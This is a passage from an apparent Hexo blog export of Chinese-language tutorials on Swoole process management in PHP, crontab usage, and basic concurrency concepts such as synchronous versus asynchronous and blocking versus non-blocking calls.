$workers;</span><br><span class="line"></span><br><span class="line">foreach ($workers as $worker) &#123;</span><br><span class="line">  if ($worker[&#39;fd&#39;] &#x3D;&#x3D;&#x3D; $fd)&#123;</span><br><span class="line">    &#x2F;&#x2F; 检查子进程是否存在</span><br><span class="line">  if (Process::kill($worker[&#39;pid&#39;], 0))&#123;</span><br><span class="line">  array_shift($worker);</span><br><span class="line">  &#x2F;&#x2F; 通过信号终止子进程</span><br><span class="line">  Process::kill($worker[&#39;pid&#39;], SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Client Close&quot; . PHP_EOL;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启动TCP 服务器</span><br><span class="line">$server-&gt;start();</span><br></pre></td></tr></table></figure><p>其实实现的原理很简单，利用Swoole 的基于事件的 Tcp 异步编程，当有客户端连接时，就创建一个子进程进行推送数据，但客户端连接断开时，就通过信号结束该客户端对应的子进程。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Swoole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Swoole 进程学习</title>
      <link href="/swoole-process-learning/"/>
      <url>/swoole-process-learning/</url>
      
        <content type="html"><![CDATA[<p>记录Swoole 进程学习过程。</p><a id="more"></a><h3 id="1-创建一个进程"><a href="#1-创建一个进程" class="headerlink" title="1. 创建一个进程"></a>1. 创建一个进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;  获取当前进程 ID</span><br><span class="line">echo &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 为进程设置名称</span><br><span class="line">cli_get_process_title(&quot;Master&quot;);</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-创建一个子进程，如何回收子进程。"><a href="#2-创建一个子进程，如何回收子进程。" class="headerlink" title="2. 创建一个子进程，如何回收子进程。"></a>2. 创建一个子进程，如何回收子进程。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;  获取当前进程 ID</span><br><span class="line">echo &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 为进程设置名称</span><br><span class="line">cli_get_process_title(&quot;Master&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建一个子进程</span><br><span class="line">$child &#x3D; new \Swoole\Process(function ()&#123;</span><br><span class="line">cli_get_process_title(&quot;Child&quot;);</span><br><span class="line">&#x2F;&#x2F; 这是一个匿名函数，也就是定义子进程需要做的事情。</span><br><span class="line">echo &quot;我是一个子进程，我的ID 是：&quot; . posix_getpid() . PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 如果就这样放着不管，那么这个子进程不会被回收，它是一个僵尸进程，虽然在那里但是并没有做事情，它的生命周期已经结束了。</span><br><span class="line">&#125;);</span><br><span class="line">&#x2F;&#x2F; 创建</span><br><span class="line">$child-&gt;start();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 回收子进程</span><br><span class="line">\Swoole\Process::wait();</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-重定向子进程标准输出"><a href="#3-重定向子进程标准输出" class="headerlink" title="3. 重定向子进程标准输出"></a>3. 重定向子进程标准输出</h3><p>子进程默认的标准输出是输出到屏幕上，可以通过对子进程设置，把输出重定向至管道。</p><p>然后再由主进程把管道中的内容读取出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;  获取当前进程 ID</span><br><span class="line">echo &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 为进程设置名称</span><br><span class="line">cli_get_process_title(&quot;Master&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建一个子进程</span><br><span class="line">$child &#x3D; new \Swoole\Process(function ()&#123;</span><br><span class="line">cli_get_process_title(&quot;Child&quot;);</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">&#x2F;&#x2F; 这是一个匿名函数，也就是定义子进程需要做的事情。</span><br><span class="line">echo &quot;我是一个子进程，我的ID 是：&quot; . posix_getpid() . PHP_EOL;</span><br><span class="line">&#x2F;&#x2F; 如果就这样放着不管，那么这个子进程不会被回收，它是一个僵尸进程，虽然在那里但是并没有做事情，它的生命周期已经结束了。</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;, true);</span><br><span class="line">&#x2F;&#x2F; 创建</span><br><span class="line">$child-&gt;start();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 回收子进程，是否阻塞等待，默认为true，阻塞。</span><br><span class="line">\Swoole\Process::wait(false);</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">echo &quot;通过主进程从管道中读取信息：&quot;. $child-&gt;read(). PHP_EOL;</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样做的好处是，可以通过主进程集中处理子进程的输出（比如可以写入日志），避免输出直接到屏幕中了。</p><p>第一个参数的作用是：是否将输出重定向至主进程。<br>true：将输出重定向至主进程管道。<br>false：直接将输出重定向至屏幕。</p><p>第二个参数的作用是：是否创建管道。<br>0：不创建</p><ol><li>创建Tcp 管道</li><li>创建Udp 管道</li></ol><p>第三个参数的作用是：是否启用协程。</p><h3 id="4-多个子进程的回收"><a href="#4-多个子进程的回收" class="headerlink" title="4. 多个子进程的回收"></a>4. 多个子进程的回收</h3><p>如果主进程只是执行一次就退出，而子进程还一直在，那么主进程也不会直接退出。</p><p>如果有多个子进程，其中某一个子进程退出了，而另一个并没有退出，这时主进程也会选择退出，而剩余的那个子进程则成了僵尸进程。<br>因为它的父进程的ID 为零。</p><p>如果不做信号处理，否则子进程一旦退出，都会引起父进程退出。如果这时还有其他子进程没有退出，这会造成其他子进程变成僵尸进程。   </p><ol start="5"><li>在子进程中创建服务</li></ol><p>分别是Master、Manager、Worker 进程，以及该子进程的父进程。</p><p>可以单独设置http 进程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$http-&gt;set([</span><br><span class="line">  &quot;worker_num&quot; &#x3D;&gt; 1</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>这样的话，进程就变成了两类：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201101204306.png" alt=""></p><p>最上面那个是父进程，下面三个分别是Master、Manger、Worker 进程。</p><h3 id="6-在进程中使用协程"><a href="#6-在进程中使用协程" class="headerlink" title="6. 在进程中使用协程"></a>6. 在进程中使用协程</h3><h3 id="7-子进程使用管道进行通信"><a href="#7-子进程使用管道进行通信" class="headerlink" title="7. 子进程使用管道进行通信"></a>7. 子进程使用管道进行通信</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">use \Swoole\Process;</span><br><span class="line">&#x2F;&#x2F;  引入协程</span><br><span class="line">use \Swoole\Coroutine\Mysql as Mysql;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;  获取当前进程 ID</span><br><span class="line">echo &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;</span><br><span class="line"></span><br><span class="line">$child &#x3D; new Process(function (Process $proces)&#123;</span><br><span class="line">&#x2F;&#x2F; $mysql &#x3D; new \think\db\builder\Mysql();</span><br><span class="line">$mysql &#x3D; new Mysql();</span><br><span class="line">$db &#x3D; $mysql-&gt;connect([&quot;host&quot; &#x3D;&gt; &quot;127.0.0.1&quot;, &quot;user&quot; &#x3D;&gt; &quot;root&quot;, &quot;password&quot; &#x3D;&gt; &quot;122410&quot;, &quot;database&quot; &#x3D;&gt; &quot;2v&quot;]);</span><br><span class="line">while (true) &#123;</span><br><span class="line">$sql &#x3D; &quot;select * from 2v.2v_user where is_delete &#x3D; 0 limit 0, 1&quot;;</span><br><span class="line">$rows &#x3D; $mysql-&gt;query($sql);</span><br><span class="line">if ($rows) &#123;</span><br><span class="line">$proces-&gt;write(&quot;我是一号子进程，正在查询数据：&quot;.$rows[0][&quot;user_name&quot;]);</span><br><span class="line">&#125;</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;, false, 1, true);</span><br><span class="line">&#x2F;&#x2F; 创建子进程</span><br><span class="line">$child-&gt;start();</span><br><span class="line"></span><br><span class="line">$child2 &#x3D; new Process(function (Process $process) &#123;</span><br><span class="line">while (true) &#123;</span><br><span class="line">sleep(1);</span><br><span class="line">$res &#x3D; $process-&gt;read();</span><br><span class="line">if ($res) &#123;</span><br><span class="line">echo &quot;我是二号子进程，正在获取数据：&quot;.$res.PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#x2F;&#x2F; 创建第二个子进程</span><br><span class="line">$child2-&gt;start();</span><br><span class="line"></span><br><span class="line">while (true) &#123;</span><br><span class="line">&#x2F;&#x2F; 一号子进程从管道中读取数据</span><br><span class="line">$data &#x3D; $child-&gt;read();</span><br><span class="line">if ($data) &#123;</span><br><span class="line">&#x2F;&#x2F; 如果数据存在，二号子进程则向管道中写入数据</span><br><span class="line">$child2-&gt;write($data);</span><br><span class="line">&#125;</span><br><span class="line">sleep(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 通过信号回收子进程</span><br><span class="line">Process::signal(SIGCHLD, function ($sig) &#123;</span><br><span class="line">&#x2F;&#x2F; 必须为false，非阻塞模式</span><br><span class="line">while ($res &#x3D; Process::wait(false)) &#123;</span><br><span class="line">echo &quot;PID &#x3D; &#123;$res[&#39;pid&#39;]&#125;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="8-子进程使用队列进行通信"><a href="#8-子进程使用队列进行通信" class="headerlink" title="8. 子进程使用队列进行通信"></a>8. 子进程使用队列进行通信</h3><h3 id="9-设置定时任务"><a href="#9-设置定时任务" class="headerlink" title="9. 设置定时任务"></a>9. 设置定时任务</h3><p>通过Swoole 设置定时任务，到点之后自动执行定时任务。</p><p>核心逻辑：创建一个Manager 进程，通过一个while 循环，定时获取获取当前时间判断是否需要执行定时任务。</p><p>如果需要执行定时任务，则发送一个信号，在主进程中监听该信号， 然后执行对应的业务逻辑。</p><p>从 Swoole 4.x 版本开始，不再以监听信号的方式作为回收子进程了。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Swoole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crontab 快速上手</title>
      <link href="/crontab-quick-start/"/>
      <url>/crontab-quick-start/</url>
      
        <content type="html"><![CDATA[<p><a href="https://zh.wikipedia.org/zh-hans/Cron" target="_blank" rel="noopener">Crontab</a> 是Unix 系统中基于时间的任务管理工具。</p><a id="more"></a><p>这个命令与传统的 Unix 命令不一样，下面会一一介绍其规则及其用法。</p><h2 id="crontab-还是-cron"><a href="#crontab-还是-cron" class="headerlink" title="crontab 还是 cron"></a>crontab 还是 cron</h2><p><a href="https://baike.baidu.com/item/crontab" target="_blank" rel="noopener">crontab</a> 还是 <a href="https://baike.baidu.com/item/cron" target="_blank" rel="noopener">cron</a>？初次接触 crontab 的同学可能会被这两个词给绕晕。</p><p>其实可以这样来理解：<code>crontab</code>就是 <code>cron</code>服务的命令行工具，而<code>cron</code>则是背后处理<code>crontab</code>投递任务的服务。</p><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><p>crontab 命令是以固定的时间格式来使用的，</p><table><thead><tr><th>表示意义</th><th>分钟</th><th>小时</th><th>日期</th><th>月份</th><th>周</th><th>命令</th></tr></thead><tbody><tr><td>范围</td><td>0～59（*）</td><td>0～23（*）</td><td>1～31（*）</td><td>1～12（*）</td><td>0～7（*）</td><td>需要执行的命令</td></tr></tbody></table><p>另外还有一些特殊字符具有特殊含义：</p><ul><li><code>*</code> 表示任何时刻都接收。举个栗子：<code>* 12 * * *</code> 表示不论何月、何日的星期几的十二点都执行指定命令。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201027163458.png" alt=""></p><h3 id="常用实例"><a href="#常用实例" class="headerlink" title="常用实例"></a>常用实例</h3><p>每分钟执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * 或者 * * * * *</span><br></pre></td></tr></table></figure><p>每五分钟执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;5 * * * *</span><br></pre></td></tr></table></figure><p>每小时执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 * * * *  或者 0 *&#x2F;1 * * *</span><br></pre></td></tr></table></figure><p>每天执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 * *  *</span><br></pre></td></tr></table></figure><p>每周执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 * *  0</span><br></pre></td></tr></table></figure><p>每月执行一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 1 *  0</span><br></pre></td></tr></table></figure><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p>初次接触<code>crontab</code> 命令时，我也比较纳闷，这个命令倒底是如何使用的？</p><p>使用 crontab 有两种方式：</p><ol><li>crontab -e：直接接受标准输入（键盘）上键入的命令，并将它们载入crontab。</li><li>crontab file：将file 作为crontab 的任务列表文件并载入crontab</li></ol><p>第一种方式没什么好说的，直接在终端添加 crontab 任务就行了，下面简单说一下第二种（其实两者的核心都是一样的）。</p><h4 id="创建crontab-文件"><a href="#创建crontab-文件" class="headerlink" title="创建crontab 文件"></a>创建crontab 文件</h4><p>首先创建一个文件，该文件的内容以<strong>功能描述</strong>、<strong>执行时间</strong>、<strong>执行任务</strong> 这几部分组成。</p><p>其中，前两者并不是一定需要，只是为了方便自己日后或其他人能快速知道这个任务具体是做什么的，<code>#</code> 表示注释。</p><p>示例，创建一个名称为<code>script_cron</code> 的crontab 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 每分钟执行一次 script.php 脚本</span><br><span class="line">* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php</span><br></pre></td></tr></table></figure><h4 id="运行crontab"><a href="#运行crontab" class="headerlink" title="运行crontab"></a>运行crontab</h4><p>为了提交刚刚创建的crontab 文件，可以把这个新创建的文件名称作为<code>crontab</code>命令的参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab script_cron</span><br></pre></td></tr></table></figure><h4 id="列出cron-服务"><a href="#列出cron-服务" class="headerlink" title="列出cron 服务"></a>列出cron 服务</h4><p>使用<code>-l</code> 参数列出crontab文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -l</span><br><span class="line"># 每分钟执行一次 script.php 脚本</span><br><span class="line">* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php</span><br></pre></td></tr></table></figure><h4 id="编辑cron-服务"><a href="#编辑cron-服务" class="headerlink" title="编辑cron 服务"></a>编辑cron 服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -e</span><br></pre></td></tr></table></figure><h4 id="删除cron-服务"><a href="#删除cron-服务" class="headerlink" title="删除cron 服务"></a>删除cron 服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -r</span><br></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h4 id="crontab-没有立即生效"><a href="#crontab-没有立即生效" class="headerlink" title="crontab 没有立即生效"></a>crontab 没有立即生效</h4><p>新创建的cron 任务，不会马上执行，至少要过两分钟才执行。</p><p>如果希望能马上执行，可以重启 crontab 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Ubuntu：</span><br><span class="line">$ service cron restart    </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Centos</span><br><span class="line">$ service crond restart</span><br></pre></td></tr></table></figure><h4 id="crontab-压根没执行"><a href="#crontab-压根没执行" class="headerlink" title="crontab 压根没执行"></a>crontab 压根没执行</h4><p>有时候会遇到直接在命令行中可以执行任务，但是定时任务却怎么都不执行，</p><p>这时首先需要确认 cron 服务是否正常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Ubuntu：</span><br><span class="line">$ service cron status    </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Centos</span><br><span class="line">$ service crond status</span><br></pre></td></tr></table></figure><p>然后确认需要执行的任务是否包含路径，如果包含请使用全局路径。</p><p>最后重启 cron 服务，通常到这里就已经可以正常执行了，如果还不行，尝试引入环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php</span><br></pre></td></tr></table></figure><h4 id="crontab-无权限执行"><a href="#crontab-无权限执行" class="headerlink" title="crontab 无权限执行"></a>crontab 无权限执行</h4><p>需要注意的是crontab 任务的调度，只有 root 和任务所有者拥有权限。</p><p>如果想要编辑/查看/删除其他用户的任务，可以使用以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -u &lt;username&gt; &lt;选项&gt;</span><br></pre></td></tr></table></figure><p>常用选项：<br><code>-e</code>：编辑任务<br><code>-l</code>：查看任务<br><code>-r</code>：删除任务</p><h4 id="查看-crontab-任务执行情况"><a href="#查看-crontab-任务执行情况" class="headerlink" title="查看 crontab 任务执行情况"></a>查看 crontab 任务执行情况</h4><p>当定时任务在指定时间执行时，会同步输出类似日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tail -f &#x2F;var&#x2F;log&#x2F;syslog</span><br><span class="line">Nov 19 12:47:01 gigabit CRON[14521]: (root) CMD (&#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php)</span><br></pre></td></tr></table></figure><p>此时就可以肯定任务调度正常。</p><p>上面那种方式确实有效，但是并不方便，那么有没有更好的方式呢？</p><p>crontab 默认没有任务的执行记录日志，但是可以通过其他方式手动创建日志文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php &gt;&gt; &#x2F;var&#x2F;log&#x2F;cron.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在<code>script.php</code> 脚本最后面增加一次输出，这样每次执行完脚本就会将输出重定向至<code>cron.log</code> 日志文件了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.linuxprobe.com/how-to-crontab.html" target="_blank" rel="noopener">crontab用法与实例</a></li><li><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html" target="_blank" rel="noopener">19. crontab 定时任务</a></li><li><a href="https://wzfou.com/crontab/#ftoc-heading-2" target="_blank" rel="noopener">Linux Crontab命令定时任务基本语法与操作教程-VPS/服务器自动化</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Crontab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Swoole 常见概念整理</title>
      <link href="/sorting-out-some-concepts-in-swoole/"/>
      <url>/sorting-out-some-concepts-in-swoole/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.swoole.com/" target="_blank" rel="noopener">Swoole</a> 是一个非常优秀的PHP 的协程高性能网络通信引擎。</p><p>在学习过程中，遇到了一些新或旧的概念，在此整理一下。</p><a id="more"></a><h2 id="长连接-短连接"><a href="#长连接-短连接" class="headerlink" title="长连接/短连接"></a>长连接/短连接</h2><p>长连接： 客户端和服务端建立连接后不进行断开，之后客户端再次访问这个服务器上的内容时，继续使用这一条连接通道。<br>短连接： 客户端和服务端建立连接，发送完数据后立马断开连接。下次要取数据，需要再次建立连接。</p><h2 id="串行-并行-并发"><a href="#串行-并行-并发" class="headerlink" title="串行/并行/并发"></a>串行/并行/并发</h2><p>串行：执行多个任务时，各个任务按顺序执行，完成一个之后才能进行下一个。<br>并行：多个任务在同一时间点发生并执行。<br>并发：同一时间段需要执行多个任务</p><h2 id="IO（Input-Output，输入输出）"><a href="#IO（Input-Output，输入输出）" class="headerlink" title="IO（Input/Output，输入输出）"></a>IO（Input/Output，输入输出）</h2><p>在计算机中，输入 / 输出（即 IO）是指信息处理系统（比如计算机）和外部世界（可以是人或其他信息处理系统）的通信。</p><p>输入是指系统接收的信号或数据，输出是指从系统发出的数据或信号。</p><p>涉及到IO 操作的通常有磁盘、网络、文件等。</p><h2 id="同步-异步"><a href="#同步-异步" class="headerlink" title="同步/异步"></a>同步/异步</h2><p><strong>同步和异步是一种消息通信机制</strong>。其关注点在于 <code>被调用者返回</code> 和 <code>结果返回</code> 之间的关系， 描述对象是被调用对象的行为。</p><p>同步：在发出一个同步调用后，没有得到结果返回之前，该调用就不会返回，只有等待结果返回之后才会继续执行后续操作。<br>异步：发出调用，直接返回。异步可以通过状态、回调、通知调用者结果，可以先执行其他操作，直到回调结果返回之后，再回来执行回调那部分的操作。</p><h2 id="阻塞-非阻塞"><a href="#阻塞-非阻塞" class="headerlink" title="阻塞/非阻塞"></a>阻塞/非阻塞</h2><p><strong>阻塞和非阻塞是一种业务流程处理方式</strong>。关注点在于调用发生时 <code>调用者状态</code> 和 <code>被调用者返回结果</code> 之间的关系。 </p><p>描述的是等待结果时候调用者的状态。 此时结果可能是同步返回的，也能是异步返回。</p><p>阻塞：在结果返回之前，该线程会被挂起，后续代码只有在结果返回后才能执行。<br>非阻塞：在不能立刻获取结果前，该调用不会阻塞当前线程。</p><h2 id="同步阻塞-非同步阻塞"><a href="#同步阻塞-非同步阻塞" class="headerlink" title="同步阻塞/非同步阻塞"></a>同步阻塞/非同步阻塞</h2><p>实际编程中，通过<strong>线程</strong>实现<strong>进程</strong>的<strong>同步非阻塞</strong>，通过<strong>协程</strong>实现<strong>线程</strong>的<strong>同步非阻塞</strong>。</p><p>同步阻塞：打电话问老板有没有某书（调用），老板说查一下，让你别挂电话（同步），你一直等待老板给你结果，什么事也不做（阻塞）。</p><p>同步非阻塞：打电话问老板有没有某书（调用），老板说查一下，让你别挂电话（同步），等电话的过程中你还一边嗑瓜子（非阻塞）。</p><h2 id="异步阻塞-异步非阻塞"><a href="#异步阻塞-异步非阻塞" class="headerlink" title="异步阻塞/异步非阻塞"></a>异步阻塞/异步非阻塞</h2><p>异步阻塞：打电话问老板有没有某书（调用），老板说你先挂电话，有了结果通知你（异步），你挂了电话后（结束调用）, 除了等老板电话通知结果，什么事情也不做（阻塞）。</p><p>异步非阻塞：打电话问老板有没有某书（调用），老板说你先挂电话，有了结果通知你（异步），你挂电话后（结束调用），一遍等电话，一遍嗑瓜子。（非阻塞）</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://learnku.com/articles/45280" target="_blank" rel="noopener">Swoole 中涉及的一些基本概念</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Swoole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初始进程与线程</title>
      <link href="/initial-process-and-thread/"/>
      <url>/initial-process-and-thread/</url>
      
        <content type="html"><![CDATA[<p>关于进程和线程，此前已经有很多优秀的文章了，这里只是抛砖引玉，基于自己的理解并整理加深印象。</p><a id="more"></a><h2 id="操作系统下的进程与线程"><a href="#操作系统下的进程与线程" class="headerlink" title="操作系统下的进程与线程"></a>操作系统下的进程与线程</h2><p>在正式介绍进程和线程之前，从操作系统的角度了解一下。</p><p>众所周知，现代的操作系统（Mac OS X，UNIX，Linux，Windows等）都是支持“多任务”的操作系统。</p><p>那么什么是“多任务”呢？简单的说，多任务就是同时运行多个任务，比如一边听歌，一边写博客。</p><p>多核 CPU可以直接同时运行多个任务，<br>而对于单核 CPU 来说，只能让系统轮流执行每个任务，因为任务之间切换很快，在宏观上看上去就是同时执行的了。</p><p>对于操作系统来说，一个任务就是一个进程。<br>而有的进程同时做几件事情，也就是同时运行多个子任务，我们把进程内的这类子任务称为线程。</p><p>由于每个进程至少要干一件事情，所以，<strong>一个进程至少有一个线程</strong>。</p><p>PHP 默认是执行单任务的进程，也就是只有一个线程。如果我们要同时执行多个任务怎么办？</p><p>有两种解决方案：</p><ol><li>启动多个进程，每个进程虽然只有一个线程，但多个进程可以一块执行多个任务。</li><li>启动一个进程，在一个进程内启动多个线程，这样，多个线程也可以一块执行多个任务。</li></ol><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>线程是最小的执行单元，而进程由至少一个线程组成，知道这一点后，再来理解多线程就不难了。</p><p><strong>多线程就是指一个进程中同时有多个线程正在执行。</strong></p><h3 id="为什么要使用多线程？"><a href="#为什么要使用多线程？" class="headerlink" 